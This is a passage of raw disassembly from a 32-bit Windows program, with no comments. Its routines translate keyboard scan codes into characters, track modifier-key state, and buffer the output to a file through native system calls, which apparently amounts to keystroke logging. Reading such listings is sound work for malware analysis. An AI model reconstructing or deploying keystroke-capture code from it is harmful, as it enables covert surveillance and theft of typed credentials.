  4016fa:	83 c0 02             	add    $0x2,%eax
  4016fd:	66 85 c9             	test   %cx,%cx
  401700:	75 f1                	jne    0x4016f3
  401702:	8d 7c 24 78          	lea    0x78(%esp),%edi
  401706:	83 c7 fe             	add    $0xfffffffe,%edi
  401709:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401710:	66 8b 47 02          	mov    0x2(%edi),%ax
  401714:	83 c7 02             	add    $0x2,%edi
  401717:	66 85 c0             	test   %ax,%ax
  40171a:	75 f4                	jne    0x401710
  40171c:	8b 0d 04 62 40 00    	mov    0x406204,%ecx
  401722:	56                   	push   %esi
  401723:	8d 54 24 7c          	lea    0x7c(%esp),%edx
  401727:	53                   	push   %ebx
  401728:	52                   	push   %edx
  401729:	89 0f                	mov    %ecx,(%edi)
  40172b:	e8 2e 43 00 00       	call   0x405a5e
  401730:	83 c4 0c             	add    $0xc,%esp
  401733:	f6 45 38 10          	testb  $0x10,0x38(%ebp)
  401737:	74 0c                	je     0x401745
  401739:	8d 44 24 78          	lea    0x78(%esp),%eax
  40173d:	50                   	push   %eax
  40173e:	e8 bd fd ff ff       	call   0x401500
  401743:	eb 3e                	jmp    0x401783
  401745:	83 7c 24 18 64       	cmpl   $0x64,0x18(%esp)
  40174a:	73 37                	jae    0x401783
  40174c:	8d 44 24 78          	lea    0x78(%esp),%eax
  401750:	8d 50 02             	lea    0x2(%eax),%edx
  401753:	66 8b 08             	mov    (%eax),%cx
  401756:	83 c0 02             	add    $0x2,%eax
  401759:	66 85 c9             	test   %cx,%cx
  40175c:	75 f5                	jne    0x401753
  40175e:	8b 74 24 20          	mov    0x20(%esp),%esi
  401762:	2b c2                	sub    %edx,%eax
  401764:	d1 f8                	sar    $1,%eax
  401766:	50                   	push   %eax
  401767:	8d 4c 24 7c          	lea    0x7c(%esp),%ecx
  40176b:	51                   	push   %ecx
  40176c:	56                   	push   %esi
  40176d:	e8 ec 42 00 00       	call   0x405a5e
  401772:	ff 44 24 24          	incl   0x24(%esp)
  401776:	83 c4 0c             	add    $0xc,%esp
  401779:	81 c6 14 04 00 00    	add    $0x414,%esi
  40177f:	89 74 24 20          	mov    %esi,0x20(%esp)
  401783:	8b 45 00             	mov    0x0(%ebp),%eax
  401786:	85 c0                	test   %eax,%eax
  401788:	0f 85 f2 fe ff ff    	jne    0x401680
  40178e:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
  401792:	50                   	push   %eax
  401793:	50                   	push   %eax
  401794:	50                   	push   %eax
  401795:	6a 01                	push   $0x1
  401797:	68 00 10 00 00       	push   $0x1000
  40179c:	55                   	push   %ebp
  40179d:	8d 54 24 3c          	lea    0x3c(%esp),%edx
  4017a1:	52                   	push   %edx
  4017a2:	50                   	push   %eax
  4017a3:	50                   	push   %eax
  4017a4:	50                   	push   %eax
  4017a5:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4017a9:	50                   	push   %eax
  4017aa:	ff 15 30 60 40 00    	call   *0x406030
  4017b0:	33 db                	xor    %ebx,%ebx
  4017b2:	85 c0                	test   %eax,%eax
  4017b4:	0f 8d ac fe ff ff    	jge    0x401666
  4017ba:	8b 44 24 14          	mov    0x14(%esp),%eax
  4017be:	3b c3                	cmp    %ebx,%eax
  4017c0:	74 0b                	je     0x4017cd
  4017c2:	50                   	push   %eax
  4017c3:	ff 15 14 60 40 00    	call   *0x406014
  4017c9:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4017cd:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4017d1:	3b fb                	cmp    %ebx,%edi
  4017d3:	76 1c                	jbe    0x4017f1
  4017d5:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4017d9:	83 c6 04             	add    $0x4,%esi
  4017dc:	8d 64 24 00          	lea    0x0(%esp),%esp
  4017e0:	56                   	push   %esi
  4017e1:	e8 aa fa ff ff       	call   0x401290
  4017e6:	81 c6 14 04 00 00    	add    $0x414,%esi
  4017ec:	83 ef 01             	sub    $0x1,%edi
  4017ef:	75 ef                	jne    0x4017e0
  4017f1:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4017f5:	51                   	push   %ecx
  4017f6:	ff 15 34 60 40 00    	call   *0x406034
  4017fc:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  401800:	8b f0                	mov    %eax,%esi
  401802:	3b f3                	cmp    %ebx,%esi
  401804:	7c 02                	jl     0x401808
  401806:	33 f6                	xor    %esi,%esi
  401808:	8b 44 24 14          	mov    0x14(%esp),%eax
  40180c:	3b c3                	cmp    %ebx,%eax
  40180e:	74 0b                	je     0x40181b
  401810:	50                   	push   %eax
  401811:	ff 15 14 60 40 00    	call   *0x406014
  401817:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  40181b:	3b eb                	cmp    %ebx,%ebp
  40181d:	74 08                	je     0x401827
  40181f:	53                   	push   %ebx
  401820:	55                   	push   %ebp
  401821:	ff 15 28 61 40 00    	call   *0x406128
  401827:	5f                   	pop    %edi
  401828:	8b c6                	mov    %esi,%eax
  40182a:	5e                   	pop    %esi
  40182b:	5d                   	pop    %ebp
  40182c:	5b                   	pop    %ebx
  40182d:	81 c4 70 02 00 00    	add    $0x270,%esp
  401833:	c2 04 00             	ret    $0x4
  401836:	cc                   	int3
  401837:	cc                   	int3
  401838:	cc                   	int3
  401839:	cc                   	int3
  40183a:	cc                   	int3
  40183b:	cc                   	int3
  40183c:	cc                   	int3
  40183d:	cc                   	int3
  40183e:	cc                   	int3
  40183f:	cc                   	int3
  401840:	83 ec 2c             	sub    $0x2c,%esp
  401843:	33 c0                	xor    %eax,%eax
  401845:	56                   	push   %esi
  401846:	57                   	push   %edi
  401847:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40184b:	89 44 24 20          	mov    %eax,0x20(%esp)
  40184f:	89 44 24 24          	mov    %eax,0x24(%esp)
  401853:	89 44 24 28          	mov    %eax,0x28(%esp)
  401857:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40185b:	33 f6                	xor    %esi,%esi
  40185d:	68 08 62 40 00       	push   $0x406208
  401862:	8d 44 24 14          	lea    0x14(%esp),%eax
  401866:	50                   	push   %eax
  401867:	89 74 24 20          	mov    %esi,0x20(%esp)
  40186b:	89 74 24 10          	mov    %esi,0x10(%esp)
  40186f:	89 74 24 14          	mov    %esi,0x14(%esp)
  401873:	ff 15 18 60 40 00    	call   *0x406018
  401879:	56                   	push   %esi
  40187a:	56                   	push   %esi
  40187b:	6a 20                	push   $0x20
  40187d:	6a 03                	push   $0x3
  40187f:	6a 01                	push   $0x1
  401881:	68 80 00 00 00       	push   $0x80
  401886:	56                   	push   %esi
  401887:	8d 54 24 24          	lea    0x24(%esp),%edx
  40188b:	52                   	push   %edx
  40188c:	8d 44 24 38          	lea    0x38(%esp),%eax
  401890:	50                   	push   %eax
  401891:	68 00 00 00 c0       	push   $0xc0000000
  401896:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  40189a:	68 a0 84 40 00       	push   $0x4084a0
  40189f:	c7 44 24 44 18 00 00 	movl   $0x18,0x44(%esp)
  4018a6:	00 
  4018a7:	89 74 24 48          	mov    %esi,0x48(%esp)
  4018ab:	c7 44 24 50 40 00 00 	movl   $0x40,0x50(%esp)
  4018b2:	00 
  4018b3:	89 4c 24 4c          	mov    %ecx,0x4c(%esp)
  4018b7:	89 74 24 54          	mov    %esi,0x54(%esp)
  4018bb:	89 74 24 58          	mov    %esi,0x58(%esp)
  4018bf:	ff 15 28 60 40 00    	call   *0x406028
  4018c5:	8b f8                	mov    %eax,%edi
  4018c7:	3b fe                	cmp    %esi,%edi
  4018c9:	7c 0f                	jl     0x4018da
  4018cb:	68 58 62 40 00       	push   $0x406258
  4018d0:	e8 9b 41 00 00       	call   0x405a70
  4018d5:	83 c4 04             	add    $0x4,%esp
  4018d8:	8b c7                	mov    %edi,%eax
  4018da:	5f                   	pop    %edi
  4018db:	5e                   	pop    %esi
  4018dc:	83 c4 2c             	add    $0x2c,%esp
  4018df:	c3                   	ret
  4018e0:	83 ec 28             	sub    $0x28,%esp
  4018e3:	53                   	push   %ebx
  4018e4:	56                   	push   %esi
  4018e5:	33 db                	xor    %ebx,%ebx
  4018e7:	57                   	push   %edi
  4018e8:	8b f8                	mov    %eax,%edi
  4018ea:	b8 a0 74 40 00       	mov    $0x4074a0,%eax
  4018ef:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  4018f3:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4018f7:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4018fb:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  4018ff:	8d 50 01             	lea    0x1(%eax),%edx
  401902:	8a 08                	mov    (%eax),%cl
  401904:	40                   	inc    %eax
  401905:	3a cb                	cmp    %bl,%cl
  401907:	75 f9                	jne    0x401902
  401909:	8b cf                	mov    %edi,%ecx
  40190b:	2b c2                	sub    %edx,%eax
  40190d:	8d 71 01             	lea    0x1(%ecx),%esi
  401910:	8a 11                	mov    (%ecx),%dl
  401912:	41                   	inc    %ecx
  401913:	3a d3                	cmp    %bl,%dl
  401915:	75 f9                	jne    0x401910
  401917:	2b ce                	sub    %esi,%ecx
  401919:	03 c8                	add    %eax,%ecx
  40191b:	81 f9 ff 0f 00 00    	cmp    $0xfff,%ecx
  401921:	7e 38                	jle    0x40195b
  401923:	68 00 10 00 00       	push   $0x1000
  401928:	53                   	push   %ebx
  401929:	68 a0 74 40 00       	push   $0x4074a0
  40192e:	e8 49 41 00 00       	call   0x405a7c
  401933:	8b c7                	mov    %edi,%eax
  401935:	83 c4 0c             	add    $0xc,%esp
  401938:	8b c8                	mov    %eax,%ecx
  40193a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401940:	8a 10                	mov    (%eax),%dl
  401942:	40                   	inc    %eax
  401943:	3a d3                	cmp    %bl,%dl
  401945:	75 f9                	jne    0x401940
  401947:	bf a0 74 40 00       	mov    $0x4074a0,%edi
  40194c:	2b c1                	sub    %ecx,%eax
  40194e:	8b f1                	mov    %ecx,%esi
  401950:	4f                   	dec    %edi
  401951:	8a 4f 01             	mov    0x1(%edi),%cl
  401954:	47                   	inc    %edi
  401955:	3a cb                	cmp    %bl,%cl
  401957:	75 f8                	jne    0x401951
  401959:	eb 1f                	jmp    0x40197a
  40195b:	8b c7                	mov    %edi,%eax
  40195d:	8b d7                	mov    %edi,%edx
  40195f:	90                   	nop
  401960:	8a 08                	mov    (%eax),%cl
  401962:	40                   	inc    %eax
  401963:	3a cb                	cmp    %bl,%cl
  401965:	75 f9                	jne    0x401960
  401967:	bf a0 74 40 00       	mov    $0x4074a0,%edi
  40196c:	2b c2                	sub    %edx,%eax
  40196e:	4f                   	dec    %edi
  40196f:	90                   	nop
  401970:	8a 4f 01             	mov    0x1(%edi),%cl
  401973:	47                   	inc    %edi
  401974:	3a cb                	cmp    %bl,%cl
  401976:	75 f8                	jne    0x401970
  401978:	8b f2                	mov    %edx,%esi
  40197a:	8b c8                	mov    %eax,%ecx
  40197c:	c1 e9 02             	shr    $0x2,%ecx
  40197f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401981:	8b c8                	mov    %eax,%ecx
  401983:	68 a0 74 40 00       	push   $0x4074a0
  401988:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40198c:	83 e1 03             	and    $0x3,%ecx
  40198f:	50                   	push   %eax
  401990:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401992:	ff 15 5c 60 40 00    	call   *0x40605c
  401998:	6a 01                	push   $0x1
  40199a:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  40199e:	51                   	push   %ecx
  40199f:	8d 54 24 18          	lea    0x18(%esp),%edx
  4019a3:	52                   	push   %edx
  4019a4:	ff 15 4c 60 40 00    	call   *0x40604c
  4019aa:	3b c3                	cmp    %ebx,%eax
  4019ac:	0f 85 ae 00 00 00    	jne    0x401a60
  4019b2:	a1 a0 84 40 00       	mov    0x4084a0,%eax
  4019b7:	3b c3                	cmp    %ebx,%eax
  4019b9:	74 53                	je     0x401a0e
  4019bb:	0f b7 54 24 10       	movzwl 0x10(%esp),%edx
  4019c0:	8b 35 40 60 40 00    	mov    0x406040,%esi
  4019c6:	53                   	push   %ebx
  4019c7:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4019cb:	51                   	push   %ecx
  4019cc:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4019d0:	52                   	push   %edx
  4019d1:	51                   	push   %ecx
  4019d2:	8d 54 24 30          	lea    0x30(%esp),%edx
  4019d6:	52                   	push   %edx
  4019d7:	53                   	push   %ebx
  4019d8:	53                   	push   %ebx
  4019d9:	53                   	push   %ebx
  4019da:	50                   	push   %eax
  4019db:	ff d6                	call   *%esi
  4019dd:	85 c0                	test   %eax,%eax
  4019df:	7d 5f                	jge    0x401a40
  4019e1:	e8 5a fe ff ff       	call   0x401840
  4019e6:	85 c0                	test   %eax,%eax
  4019e8:	7c 69                	jl     0x401a53
  4019ea:	0f b7 4c 24 10       	movzwl 0x10(%esp),%ecx
  4019ef:	8b 54 24 14          	mov    0x14(%esp),%edx
  4019f3:	53                   	push   %ebx
  4019f4:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4019f8:	50                   	push   %eax
  4019f9:	51                   	push   %ecx
  4019fa:	8b 0d a0 84 40 00    	mov    0x4084a0,%ecx
  401a00:	52                   	push   %edx
  401a01:	8d 44 24 30          	lea    0x30(%esp),%eax
  401a05:	50                   	push   %eax
  401a06:	53                   	push   %ebx
  401a07:	53                   	push   %ebx
  401a08:	53                   	push   %ebx
  401a09:	51                   	push   %ecx
  401a0a:	ff d6                	call   *%esi
  401a0c:	eb 2e                	jmp    0x401a3c
  401a0e:	e8 2d fe ff ff       	call   0x401840
  401a13:	85 c0                	test   %eax,%eax
  401a15:	7c 3c                	jl     0x401a53
  401a17:	0f b7 44 24 10       	movzwl 0x10(%esp),%eax
  401a1c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401a20:	53                   	push   %ebx
  401a21:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  401a25:	52                   	push   %edx
  401a26:	50                   	push   %eax
  401a27:	a1 a0 84 40 00       	mov    0x4084a0,%eax
  401a2c:	51                   	push   %ecx
  401a2d:	8d 54 24 30          	lea    0x30(%esp),%edx
  401a31:	52                   	push   %edx
  401a32:	53                   	push   %ebx
  401a33:	53                   	push   %ebx
  401a34:	53                   	push   %ebx
  401a35:	50                   	push   %eax
  401a36:	ff 15 40 60 40 00    	call   *0x406040
  401a3c:	85 c0                	test   %eax,%eax
  401a3e:	7c 13                	jl     0x401a53
  401a40:	68 00 10 00 00       	push   $0x1000
  401a45:	53                   	push   %ebx
  401a46:	68 a0 74 40 00       	push   $0x4074a0
  401a4b:	e8 2c 40 00 00       	call   0x405a7c
  401a50:	83 c4 0c             	add    $0xc,%esp
  401a53:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401a57:	51                   	push   %ecx
  401a58:	ff 15 68 60 40 00    	call   *0x406068
  401a5e:	33 c0                	xor    %eax,%eax
  401a60:	5f                   	pop    %edi
  401a61:	5e                   	pop    %esi
  401a62:	5b                   	pop    %ebx
  401a63:	83 c4 28             	add    $0x28,%esp
  401a66:	c3                   	ret
  401a67:	cc                   	int3
  401a68:	cc                   	int3
  401a69:	cc                   	int3
  401a6a:	cc                   	int3
  401a6b:	cc                   	int3
  401a6c:	cc                   	int3
  401a6d:	cc                   	int3
  401a6e:	cc                   	int3
  401a6f:	cc                   	int3
  401a70:	66 83 f9 53          	cmp    $0x53,%cx
  401a74:	77 11                	ja     0x401a87
  401a76:	66 83 f9 47          	cmp    $0x47,%cx
  401a7a:	72 0b                	jb     0x401a87
  401a7c:	66 85 c0             	test   %ax,%ax
  401a7f:	74 1f                	je     0x401aa0
  401a81:	66 83 f8 01          	cmp    $0x1,%ax
  401a85:	74 19                	je     0x401aa0
  401a87:	33 c0                	xor    %eax,%eax
  401a89:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401a90:	66 39 0c 45 68 71 40 	cmp    %cx,0x407168(,%eax,2)
  401a97:	00 
  401a98:	74 09                	je     0x401aa3
  401a9a:	40                   	inc    %eax
  401a9b:	83 f8 26             	cmp    $0x26,%eax
  401a9e:	7c f0                	jl     0x401a90
  401aa0:	83 c8 ff             	or     $0xffffffff,%eax
  401aa3:	c3                   	ret
  401aa4:	cc                   	int3
  401aa5:	cc                   	int3
  401aa6:	cc                   	int3
  401aa7:	cc                   	int3
  401aa8:	cc                   	int3
  401aa9:	cc                   	int3
  401aaa:	cc                   	int3
  401aab:	cc                   	int3
  401aac:	cc                   	int3
  401aad:	cc                   	int3
  401aae:	cc                   	int3
  401aaf:	cc                   	int3
  401ab0:	83 ec 10             	sub    $0x10,%esp
  401ab3:	33 d2                	xor    %edx,%edx
  401ab5:	56                   	push   %esi
  401ab6:	c6 44 24 04 00       	movb   $0x0,0x4(%esp)
  401abb:	89 54 24 05          	mov    %edx,0x5(%esp)
  401abf:	89 54 24 09          	mov    %edx,0x9(%esp)
  401ac3:	89 54 24 0d          	mov    %edx,0xd(%esp)
  401ac7:	84 c9                	test   %cl,%cl
  401ac9:	0f 88 c2 01 00 00    	js     0x401c91
  401acf:	0f b7 f1             	movzwl %cx,%esi
  401ad2:	8d 56 e3             	lea    -0x1d(%esi),%edx
  401ad5:	83 fa 1d             	cmp    $0x1d,%edx
  401ad8:	0f 87 a6 00 00 00    	ja     0x401b84
  401ade:	0f b6 92 ac 1c 40 00 	movzbl 0x401cac(%edx),%edx
  401ae5:	ff 24 95 98 1c 40 00 	jmp    *0x401c98(,%edx,4)
  401aec:	66 83 f8 01          	cmp    $0x1,%ax
  401af0:	75 0e                	jne    0x401b00
  401af2:	6a 08                	push   $0x8
  401af4:	68 74 62 40 00       	push   $0x406274
  401af9:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401afd:	50                   	push   %eax
  401afe:	eb 12                	jmp    0x401b12
  401b00:	66 83 f8 02          	cmp    $0x2,%ax
  401b04:	75 30                	jne    0x401b36
  401b06:	6a 08                	push   $0x8
  401b08:	68 80 62 40 00       	push   $0x406280
  401b0d:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401b11:	51                   	push   %ecx
  401b12:	e8 4d 3f 00 00       	call   0x405a64
  401b17:	83 c4 0c             	add    $0xc,%esp
  401b1a:	80 7c 24 04 00       	cmpb   $0x0,0x4(%esp)
  401b1f:	74 09                	je     0x401b2a
  401b21:	8d 44 24 04          	lea    0x4(%esp),%eax
  401b25:	e8 b6 fd ff ff       	call   0x4018e0
  401b2a:	c6 05 0a 70 40 00 01 	movb   $0x1,0x40700a
  401b31:	5e                   	pop    %esi
  401b32:	83 c4 10             	add    $0x10,%esp
  401b35:	c3                   	ret
  401b36:	66 85 c0             	test   %ax,%ax
  401b39:	74 1c                	je     0x401b57
  401b3b:	66 83 f8 03          	cmp    $0x3,%ax
  401b3f:	74 16                	je     0x401b57
  401b41:	66 83 f8 04          	cmp    $0x4,%ax
  401b45:	0f 85 46 01 00 00    	jne    0x401c91
  401b4b:	c6 05 98 74 40 00 01 	movb   $0x1,0x407498
  401b52:	5e                   	pop    %esi
  401b53:	83 c4 10             	add    $0x10,%esp
  401b56:	c3                   	ret
  401b57:	c6 05 0a 70 40 00 00 	movb   $0x0,0x40700a
  401b5e:	5e                   	pop    %esi
  401b5f:	83 c4 10             	add    $0x10,%esp
  401b62:	c3                   	ret
  401b63:	66 85 c0             	test   %ax,%ax
  401b66:	0f 94 c2             	sete   %dl
  401b69:	88 15 08 70 40 00    	mov    %dl,0x407008
  401b6f:	5e                   	pop    %esi
  401b70:	83 c4 10             	add    $0x10,%esp
  401b73:	c3                   	ret
  401b74:	66 85 c0             	test   %ax,%ax
  401b77:	0f 94 c0             	sete   %al
  401b7a:	a2 0b 70 40 00       	mov    %al,0x40700b
  401b7f:	5e                   	pop    %esi
  401b80:	83 c4 10             	add    $0x10,%esp
  401b83:	c3                   	ret
  401b84:	66 85 c0             	test   %ax,%ax
  401b87:	74 0a                	je     0x401b93
  401b89:	66 83 f8 02          	cmp    $0x2,%ax
  401b8d:	0f 85 fe 00 00 00    	jne    0x401c91
  401b93:	66 83 f9 45          	cmp    $0x45,%cx
  401b97:	75 4f                	jne    0x401be8
  401b99:	80 3d 98 74 40 00 00 	cmpb   $0x0,0x407498
  401ba0:	74 1d                	je     0x401bbf
  401ba2:	6a 08                	push   $0x8
  401ba4:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401ba8:	68 8c 62 40 00       	push   $0x40628c
  401bad:	51                   	push   %ecx
  401bae:	e8 b1 3e 00 00       	call   0x405a64
  401bb3:	c6 05 98 74 40 00 00 	movb   $0x0,0x407498
  401bba:	e9 bf 00 00 00       	jmp    0x401c7e
  401bbf:	66 85 c0             	test   %ax,%ax
  401bc2:	0f 85 b9 00 00 00    	jne    0x401c81
  401bc8:	38 05 0c 70 40 00    	cmp    %al,0x40700c
  401bce:	6a 0a                	push   $0xa
  401bd0:	0f 94 c2             	sete   %dl
  401bd3:	68 98 62 40 00       	push   $0x406298
  401bd8:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401bdc:	88 15 0c 70 40 00    	mov    %dl,0x40700c
  401be2:	50                   	push   %eax
  401be3:	e9 91 00 00 00       	jmp    0x401c79
  401be8:	66 83 f9 37          	cmp    $0x37,%cx
  401bec:	75 18                	jne    0x401c06
  401bee:	66 85 c0             	test   %ax,%ax
  401bf1:	75 13                	jne    0x401c06
  401bf3:	8d 44 24 04          	lea    0x4(%esp),%eax
  401bf7:	c6 44 24 04 2a       	movb   $0x2a,0x4(%esp)
  401bfc:	e8 df fc ff ff       	call   0x4018e0
  401c01:	5e                   	pop    %esi
  401c02:	83 c4 10             	add    $0x10,%esp
  401c05:	c3                   	ret
  401c06:	e8 65 fe ff ff       	call   0x401a70
  401c0b:	83 f8 ff             	cmp    $0xffffffff,%eax
  401c0e:	75 59                	jne    0x401c69
  401c10:	66 83 f9 54          	cmp    $0x54,%cx
  401c14:	73 6b                	jae    0x401c81
  401c16:	80 3d 08 70 40 00 00 	cmpb   $0x0,0x407008
  401c1d:	75 1b                	jne    0x401c3a
  401c1f:	80 3d 09 70 40 00 00 	cmpb   $0x0,0x407009
  401c26:	74 32                	je     0x401c5a
  401c28:	b8 54 00 00 00       	mov    $0x54,%eax
  401c2d:	8a 8c 06 10 70 40 00 	mov    0x407010(%esi,%eax,1),%cl
  401c34:	88 4c 24 04          	mov    %cl,0x4(%esp)
  401c38:	eb 47                	jmp    0x401c81
  401c3a:	0f b6 05 09 70 40 00 	movzbl 0x407009,%eax
  401c41:	f7 d8                	neg    %eax
  401c43:	1b c0                	sbb    %eax,%eax
  401c45:	83 e0 54             	and    $0x54,%eax
  401c48:	8a 8c 06 b8 70 40 00 	mov    0x4070b8(%esi,%eax,1),%cl
  401c4f:	05 a8 00 00 00       	add    $0xa8,%eax
  401c54:	88 4c 24 04          	mov    %cl,0x4(%esp)
  401c58:	eb 27                	jmp    0x401c81
  401c5a:	33 c0                	xor    %eax,%eax
  401c5c:	8a 8c 06 10 70 40 00 	mov    0x407010(%esi,%eax,1),%cl
  401c63:	88 4c 24 04          	mov    %cl,0x4(%esp)
  401c67:	eb 18                	jmp    0x401c81
  401c69:	6b c0 0d             	imul   $0xd,%eax,%eax
  401c6c:	6a 0d                	push   $0xd
  401c6e:	05 b8 71 40 00       	add    $0x4071b8,%eax
  401c73:	50                   	push   %eax
  401c74:	8d 54 24 0c          	lea    0xc(%esp),%edx
  401c78:	52                   	push   %edx
  401c79:	e8 e6 3d 00 00       	call   0x405a64
  401c7e:	83 c4 0c             	add    $0xc,%esp
  401c81:	80 7c 24 04 00       	cmpb   $0x0,0x4(%esp)
  401c86:	74 09                	je     0x401c91
  401c88:	8d 44 24 04          	lea    0x4(%esp),%eax
  401c8c:	e8 4f fc ff ff       	call   0x4018e0
  401c91:	5e                   	pop    %esi
  401c92:	83 c4 10             	add    $0x10,%esp
  401c95:	c3                   	ret
  401c96:	8b ff                	mov    %edi,%edi
  401c98:	ec                   	in     (%dx),%al
  401c99:	1a 40 00             	sbb    0x0(%eax),%al
  401c9c:	63 1b                	arpl   %ebx,(%ebx)
  401c9e:	40                   	inc    %eax
  401c9f:	00 74 1b 40          	add    %dh,0x40(%ebx,%ebx,1)
  401ca3:	00 91 1c 40 00 84    	add    %dl,-0x7bffbfe4(%ecx)
  401ca9:	1b 40 00             	sbb    0x0(%eax),%eax
  401cac:	00 04 04             	add    %al,(%esp,%eax,1)
  401caf:	04 04                	add    $0x4,%al
  401cb1:	04 04                	add    $0x4,%al
  401cb3:	04 04                	add    $0x4,%al
  401cb5:	04 04                	add    $0x4,%al
  401cb7:	04 04                	add    $0x4,%al
  401cb9:	01 04 04             	add    %eax,(%esp,%eax,1)
  401cbc:	04 04                	add    $0x4,%al
  401cbe:	04 04                	add    $0x4,%al
  401cc0:	04 04                	add    $0x4,%al
  401cc2:	04 04                	add    $0x4,%al
  401cc4:	04 01                	add    $0x1,%al
  401cc6:	04 02                	add    $0x2,%al
  401cc8:	04 03                	add    $0x3,%al
  401cca:	cc                   	int3
  401ccb:	cc                   	int3
  401ccc:	cc                   	int3
  401ccd:	cc                   	int3
  401cce:	cc                   	int3
  401ccf:	cc                   	int3
  401cd0:	55                   	push   %ebp
  401cd1:	8b ec                	mov    %esp,%ebp
  401cd3:	6a ff                	push   $0xffffffff
  401cd5:	68 98 6b 40 00       	push   $0x406b98
  401cda:	68 82 5a 40 00       	push   $0x405a82
  401cdf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401ce5:	50                   	push   %eax
  401ce6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401ced:	83 ec 2c             	sub    $0x2c,%esp
  401cf0:	53                   	push   %ebx
  401cf1:	56                   	push   %esi
  401cf2:	57                   	push   %edi
  401cf3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  401cf6:	8b f9                	mov    %ecx,%edi
  401cf8:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401cff:	6a 00                	push   $0x0
  401d01:	6a 00                	push   $0x0
  401d03:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401d06:	50                   	push   %eax
  401d07:	ff 15 58 60 40 00    	call   *0x406058
  401d0d:	85 ff                	test   %edi,%edi
  401d0f:	0f 84 9b 00 00 00    	je     0x401db0
  401d15:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401d18:	51                   	push   %ecx
  401d19:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401d1c:	52                   	push   %edx
  401d1d:	6a 01                	push   $0x1
  401d1f:	6a 1c                	push   $0x1c
  401d21:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401d24:	50                   	push   %eax
  401d25:	6a 00                	push   $0x0
  401d27:	6a 00                	push   $0x0
  401d29:	57                   	push   %edi
  401d2a:	68 40 00 0b 00       	push   $0xb0040
  401d2f:	ff 15 44 60 40 00    	call   *0x406044
  401d35:	8b f0                	mov    %eax,%esi
  401d37:	85 f6                	test   %esi,%esi
  401d39:	74 75                	je     0x401db0
  401d3b:	80 7e 22 00          	cmpb   $0x0,0x22(%esi)
  401d3f:	7e 6f                	jle    0x401db0
  401d41:	80 7e 23 00          	cmpb   $0x0,0x23(%esi)
  401d45:	7e 69                	jle    0x401db0
  401d47:	8b d6                	mov    %esi,%edx
  401d49:	8b cf                	mov    %edi,%ecx
  401d4b:	ff 15 90 60 40 00    	call   *0x406090
  401d51:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401d54:	3d 03 01 00 00       	cmp    $0x103,%eax
  401d59:	75 12                	jne    0x401d6d
  401d5b:	6a 00                	push   $0x0
  401d5d:	6a 00                	push   $0x0
  401d5f:	6a 00                	push   $0x0
  401d61:	6a 05                	push   $0x5
  401d63:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401d66:	51                   	push   %ecx
  401d67:	ff 15 78 60 40 00    	call   *0x406078
  401d6d:	8b 46 18             	mov    0x18(%esi),%eax
  401d70:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401d73:	85 c0                	test   %eax,%eax
  401d75:	7c 18                	jl     0x401d8f
  401d77:	0f b7 4d e2          	movzwl -0x1e(%ebp),%ecx
  401d7b:	8b d1                	mov    %ecx,%edx
  401d7d:	83 e2 04             	and    $0x4,%edx
  401d80:	88 15 09 70 40 00    	mov    %dl,0x407009
  401d86:	83 e1 02             	and    $0x2,%ecx
  401d89:	88 0d 0c 70 40 00    	mov    %cl,0x40700c
  401d8f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401d96:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401d99:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401da0:	5f                   	pop    %edi
  401da1:	5e                   	pop    %esi
  401da2:	5b                   	pop    %ebx
  401da3:	8b e5                	mov    %ebp,%esp
  401da5:	5d                   	pop    %ebp
  401da6:	c3                   	ret
  401da7:	b8 01 00 00 00       	mov    $0x1,%eax
  401dac:	c3                   	ret
  401dad:	8b 65 e8             	mov    -0x18(%ebp),%esp
  401db0:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401db7:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  401dbc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401dbf:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401dc6:	5f                   	pop    %edi
  401dc7:	5e                   	pop    %esi
  401dc8:	5b                   	pop    %ebx
  401dc9:	8b e5                	mov    %ebp,%esp
